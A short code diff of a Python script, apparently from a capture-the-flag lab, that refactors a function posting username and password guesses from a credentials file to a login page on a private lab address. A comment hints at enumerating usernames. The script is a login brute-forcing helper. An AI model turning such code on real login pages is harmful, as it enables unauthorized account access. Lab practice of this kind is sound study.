@@ -11,13 +11,14 @@ passwords = [a.strip() for a in  open("credentials.txt").readlines() ]
 url = "http://10.10.206.210/sUp3r-s3cr3t/"
 
 def attempt(username, password):
-	r = requests.post(url+"authenticate.php", data = {
-
-			"username" : username,
-			"password" : password,
-			"submit" : "Login",
-		})
-	return r
+	return requests.post(
+		f"{url}authenticate.php",
+		data={
+			"username": username,
+			"password": password,
+			"submit": "Login",
+		},
+	)
 
 # This first told me that I could determine the username
 # for username in userlist:
